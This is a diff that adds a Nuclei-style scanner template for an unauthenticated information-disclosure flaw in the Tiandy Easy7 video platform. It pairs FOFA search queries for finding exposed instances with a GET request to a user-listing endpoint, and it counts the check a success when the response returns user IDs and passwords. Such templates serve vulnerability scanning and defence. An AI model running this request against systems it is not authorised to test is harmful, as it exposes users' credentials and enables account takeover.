@@ -1,0 +1,27 @@
+id: TianDiWeiYe-Easy7-loadAllUserBeans-Information-Disclosure
+
+info:
+  name: 天地伟业Easy7 /Easy7/rest/user/loadAllUserBeans 敏感信息泄露
+  author: HuanXiong
+  severity: medium
+  description: |
+    fofa: body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7_logo_transparent.png") && title="平台"
+    天地伟业 Easy7 /Easy7/rest/user/loadAllUserBeans 接口存在信息泄露漏洞，攻击者可通过构造恶意HTTP请求，利用漏洞接口/路径触发漏洞，获取系统用户敏感信息，进一步造成账户被接管等安全风险，危害系统安全。
+  reference:
+    - 
+  tags: information-disclosure, tiandy, easy7
+
+http:
+  - raw:
+      - |-
+        GET /Easy7/rest/user/loadAllUserBeans HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+        Accept: application/json, text/javascript, */*; q=0.01
+        Connection: keep-alive
+
+    matchers:
+      - type: dsl
+        name: 信息泄露
+        dsl:
+          - "status_code == 200 && contains_all(body,'userId','password','description','userCaption')"
